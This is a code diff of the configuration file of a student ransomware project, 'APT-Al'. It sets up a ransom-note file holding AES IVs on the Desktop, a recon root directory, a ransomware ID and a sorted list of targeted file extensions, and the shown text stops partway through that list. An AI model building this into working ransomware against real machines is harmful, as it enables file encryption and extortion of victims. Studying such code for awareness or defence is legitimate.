@@ -1,22 +1,32 @@
 import os
-from pwd import getpwuid
+from datetime import datetime
 
 who_we_are = "APT-Al"
+version = "v1.1"
+what_is_my_purpose = """
+Hi there,
+we are a group of university students from Hacettepe.
+We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people.
+"""
 
-# prevent self-encryption
 what_is_my_name = "zararliyim.exe"
-what_is_my_purpose = """\nExplain our aim\n"""
+what_is_my_id = "1"+"\n" # ransomwareID
+when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n"
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
+desktop_directory = os.path.join(root_directory,"Desktop")
 root_directory = os.path.join(root_directory,"test")
 
+# if this file have been created, we're going to create a new one not to ruin old keys
+aesIV_file_store_name = "HEYY_APTAl_READ_ME.txt"
+_len_aesIV_file_store_name = len(aesIV_file_store_name)
+_count_of_file = 0
+for name in os.listdir(desktop_directory):
+    if name[-_len_aesIV_file_store_name:] == aesIV_file_store_name:
+        _count_of_file += 1
 # where to write the pairs made up of a file and AES IV
-# aesIV_file_store_path = os.path.join(root_directory,"HEYY_APTAl_READ_ME.txt")
-aesIV_file_store_path = "/home/kali/Desktop/HEYY_APTAl_READ_ME.txt"
-
-os_name = os.name
-
+aesIV_file_store_path = os.path.join(desktop_directory,str(_count_of_file)+aesIV_file_store_name)
 
 # the extensions are ordered so we can use binary search
 file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
